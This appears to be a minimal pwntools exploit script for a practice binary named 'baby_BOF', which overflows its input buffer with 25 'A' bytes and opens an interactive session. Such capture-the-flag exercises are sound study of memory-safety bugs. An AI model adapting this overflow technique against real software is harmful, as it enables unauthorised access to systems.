from pwn import *

# setup process
p = process("./baby_BOF")
context.binary = "./baby_BOF"

# payload 
payload = b'A' * 25

# send payload
p.sendline(payload)
p.interactive()